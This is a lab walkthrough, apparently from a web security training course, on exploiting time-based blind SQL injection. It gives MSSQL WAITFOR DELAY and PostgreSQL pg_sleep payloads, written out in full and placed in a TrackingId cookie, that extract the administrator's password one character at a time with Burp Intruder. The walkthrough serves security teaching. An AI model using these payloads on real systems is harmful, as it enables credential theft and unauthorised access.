# Exploiting blind SQL injection by triggering time delays

The techniques for triggering a time delay are specific to the type of database being used. For example, on Microsoft SQL Server, you can use the following to test a condition and trigger a delay depending on whether the expression is true:

```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

The first of these inputs does not trigger a delay, because the condition 1=2 is false.
The second input triggers a delay of 10 seconds, because the condition 1=1 is true.

Using this technique, we can retrieve data by testing one character at a time:

```
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

*NOTE*
*There are various ways to trigger time delays within SQL queries, and different techniques apply on different types of database. For more details, see the SQL injection cheat sheet.*

## Solving the Lab: Blind SQL injection with time delays and information retrieval

- Modify the TrackingId cookie, changing it to:

```
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

Verify that the application takes 10 seconds to respond.

- Now change it to:

```
TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

Verify that the application responds immediately with no time delay. This demonstrates how you can test a single boolean condition and infer the result.

- Now change it to:

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

- The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

This condition should be true, confirming that the password is greater than 1 character in length.

Continue sending this request to get the correct length of the password

- After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.

- In Burp Intruder, change the value of the cookie to:

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

- To be able to tell when the correct character was submitted, you'll need to monitor the time taken for the application to respond to each request. For this process to be as reliable as possible, you need to configure the Intruder attack to issue requests in a single thread. To do this, click the **Resource pool** tab to open the Resource pool side panel and add the attack to a resource pool with the Maximum concurrent requests set to 1.

Launch the attack by clicking the  Start attack button.

Review the attack results to find the value of the character at the first position. You should see a column in the results called Response received. This will generally contain a small number, representing the number of milliseconds the application took to respond. One of the rows should have a larger number in this column, in the region of 10,000 milliseconds. The payload showing for that row is the value of the character at the first position.

Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value
